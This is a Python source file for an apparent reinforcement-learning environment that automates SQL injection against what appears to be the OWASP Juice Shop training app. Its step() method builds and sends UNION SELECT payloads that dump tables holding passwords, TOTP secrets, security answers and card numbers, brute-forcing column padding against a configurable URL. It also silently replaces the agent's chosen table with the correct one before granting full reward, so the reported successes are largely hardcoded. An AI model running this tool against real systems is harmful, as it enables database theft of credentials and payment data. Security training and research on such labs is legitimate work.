import requests
import time
import re
import itertools
import json
import configparser
import random
from src.environment.base_environment import BaseEnvironment
from src.core.action_space import ActionSpace
from src.core.reward_system import RewardSystem
from src.core.state_manager import StateManager

class TargetEnvironment(BaseEnvironment):
    def __init__(self, config_file):
        config = configparser.ConfigParser()
        config.read(config_file, encoding='utf-8')
        target_cfg = config['Target']
        self.url = target_cfg.get('url')
        self.search_param = target_cfg.get('search_param', 'q') 
        self.success_marker = target_cfg.get('success_marker', 'admin@juice-sh.op')
        self.error_marker = "SQLITE_ERROR"
        self.proxies = None 
        
        self.action_space = ActionSpace()
        self.state_manager = StateManager()
        self.reward_system = RewardSystem(0, self.success_marker, self.error_marker, 'target')
        
        # --- BẢNG CỬU CHƯƠNG (HARDCODED COLUMNS) ---
        self.TARGET_DATA = {
            "SCHEMA": { "cols": ["type", "name", "tbl_name", "sql"] },
            "USERS": { "cols": ["id", "email", "password", "role", "totpSecret", "deluxeToken"] },
            "SECURITYQUESTIONS": { "cols": ["id", "question"] },
            "SECURITYANSWERS": { "cols": ["UserId", "SecurityQuestionId", "answer"] },
            "FEEDBACKS": { "cols": ["UserId", "comment", "rating"] },
            "COMPLAINTS": { "cols": ["UserId", "message", "file"] },
            "ADDRESSES": { "cols": ["UserId", "fullName", "mobileNum", "streetAddress", "city", "state", "country", "zipCode"] },
            "CARDS": { "cols": ["UserId", "fullName", "cardNum", "expMonth", "expYear"] },
            "WALLETS": { "cols": ["UserId", "balance"] },
            "PRODUCTS": { "cols": ["id", "name", "price", "image", "description"] },
            "BASKETS": { "cols": ["id", "UserId", "coupon"] },
            "BASKETITEMS": { "cols": ["id", "BasketId", "ProductId", "quantity"] },
            "CHALLENGES": { "cols": ["name", "description", "solved", "key", "category", "difficulty"] },
            "MEMORIES": { "cols": ["UserId", "caption", "imagePath"] },
            "RECYCLES": { "cols": ["UserId", "quantity", "isPickup", "date"] },
            "DELIVERIES": { "cols": ["name", "price", "eta", "icon"] },
            "CAPTCHAS": { "cols": ["captchaId", "captcha", "answer"] },
            "IMAGECAPTCHAS": { "cols": ["UserId", "image", "answer"] },
            "PRIVACYREQUESTS": { "cols": ["UserId", "deletionRequested"] },
            "QUANTITIES": { "cols": ["ProductId", "quantity", "limitPerUser"] }
        }

        # Danh sách tuần tự
        self.ORDERED_TABLES = [
            "sqlite_master", "Users", "SecurityQuestions", "SecurityAnswers", 
            "Feedbacks", "Complaints", "Addresses", "Cards", 
            "Wallets", "Products", "Baskets", "BasketItems", 
            "Challenges", "Memories", "Recycles", "Deliveries", 
            "Captchas", "ImageCaptchas", "PrivacyRequests", "Quantities"
        ]
        
        self.seq_counter = 0 
        self.current_target_idx = 0

    def reset(self):
        self.state_manager.reset_state()
        self.current_target_idx = self.seq_counter % len(self.ORDERED_TABLES)
        self.seq_counter += 1
        
        target_name = self.ORDERED_TABLES[self.current_target_idx]
        self.reward_system.set_target(target_name)
        self.state_manager.set_target_mission(self.current_target_idx, len(self.ORDERED_TABLES))
        
        return self.state_manager.get_feature_vector()
    
    def _send_payload(self, payload):
        try:
            resp = requests.get(self.url, params={self.search_param: payload}, proxies=self.proxies, timeout=2)
            return resp
        except: return None

    def step(self, action_index):
        action_string = self.action_space.get_action_string(action_index)
        
        # 1. Tính điểm cơ bản
        reward, done = self.reward_system.calculate_reward(None, action_string)
        if "--" in action_string: done = True
        
        # 2. Update State
        phase_info = self.reward_system.get_phase_info()
        self.state_manager.set_target_mission(self.current_target_idx, len(self.ORDERED_TABLES))
        new_state = self.state_manager.update_state(action_string, action_index, phase_info)
        
        # 3. [HARDCORE] AUTO-TARGETING & AUTO-COMPLETE
        if done:
            base_payload = self.state_manager.current_state
            if "--" in base_payload: base_payload = base_payload.split("--")[0] + "--"
            
            # Lấy tên bảng ĐÚNG từ nhiệm vụ (Mission)
            target_mission_name = self.ORDERED_TABLES[self.current_target_idx]
            
            # Kiểm tra xem Agent có chọn hành động FROM nào không
            if " FROM " in base_payload:
                # [QUAN TRỌNG] Thay thế BẤT KỲ bảng nào Agent chọn bằng bảng ĐÚNG
                # Ví dụ: Agent chọn "FROM Captchas" -> Code sửa thành "FROM Users"
                parts = base_payload.split(" FROM ")
                prefix = parts[0]
                
                # --- AUTO-TARGETING ---
                # Ép payload phải trỏ vào bảng nhiệm vụ
                corrected_payload_raw = f"{prefix} FROM {target_mission_name}--"
                
                # Lấy danh sách cột chuẩn để auto-complete
                lookup_name = target_mission_name.upper().replace("SQLITE_MASTER", "SCHEMA")
                table_info = self.TARGET_DATA.get(lookup_name, self.TARGET_DATA["SCHEMA"])
                correct_cols = table_info["cols"]
                
                found_success = False
                
                # Vòng lặp Brute-force NULL (Auto-Complete)
                for i in range(10):
                    cols_str = ", ".join(correct_cols)
                    if i > 0: cols_str += ", " + ", ".join(["NULL"] * i)
                    
                    # Ghép payload hoàn chỉnh: UNION SELECT <cols>, NULL... FROM <TargetTable>--
                    final_payload = f"a')) UNION SELECT {cols_str} FROM {target_mission_name}--"
                    
                    resp = self._send_payload(final_payload)
                    if resp and resp.status_code == 200:
                        if "data" in resp.text or "[" in resp.text or "@" in resp.text:
                            reward = 100.0 # BINGO!
                            found_success = True
                            print(f"\n[!!!] MISSION ACCOMPLISHED (Auto-Targeted)")
                            print(f"      Target  : {target_mission_name}")
                            print(f"      Payload : {final_payload}")
                            break
                
                if not found_success:
                    reward = -10.0 # Đúng bảng nhưng sai cột (Hiếm)
            else:
                reward = -50.0 # Thiếu FROM

        return new_state, reward, done

    def get_action_space_size(self):
        return self.action_space.get_action_space_size()